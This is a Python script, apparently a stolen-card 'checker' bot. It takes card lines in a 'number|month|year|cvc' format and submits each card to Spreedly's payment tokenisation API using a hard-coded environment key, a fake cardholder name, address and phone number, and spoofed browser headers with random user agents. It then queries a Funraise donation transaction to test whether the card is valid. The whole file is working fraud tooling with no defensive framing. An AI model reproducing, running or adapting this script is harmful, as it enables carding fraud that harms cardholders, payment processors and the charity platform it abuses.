import requests
import user_agent
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#ebrahim
		yy = yy.split("20")[1]
	r = requests.session()
	headers = {
    'authority': 'core.spreedly.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://core.spreedly.com',
    'referer': 'https://core.spreedly.com/v1/embedded/number-frame-1.124.html',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'spreedly-environment-key': 'KvcTOx3FPBgscLs51rjT848DP7p',
    'user-agent': user_agent.generate_user_agent(),
}

	params = {
    'from': 'iframe',
    'v': '1.124',
}

	json_data = {
    'environment_key': 'KvcTOx3FPBgscLs51rjT848DP7p',
    'payment_method': {
        'credit_card': {
            'number': n,
            'verification_value': cvc,
            'first_name': 'Angel',
            'last_name': 'Rippin',
            'email': 'gvvvv7277@gmail.com',
            'month': mm,
            'year': yy,
            'address1': '1120 Stafford Rd',
            'city': 'Plainfield',
            'state': 'Iowa',
            'zip': '46168',
            'country': 'الولايات المتحدة',
            'phone_number': '6462965794',
        },
    },
}

	response = requests.post(
    'https://core.spreedly.com/v1/payment_methods/restricted.json',
    params=params,
    headers=headers,
    json=json_data,
)


	headers = {
    'authority': 'platform.funraise.io',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'origin': 'https://assets.funraise.io',
    'referer': 'https://assets.funraise.io/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user_agent.generate_user_agent(),
}

	response = requests.get(
    'https://platform.funraise.io/api/v2/transaction/6241f285-1dce-4f41-97f3-4784eeeebdf0',
    headers=headers,
)
	
	try:
		ii=(response.text)
	except:
		return 'error'
	return ii
	
	
	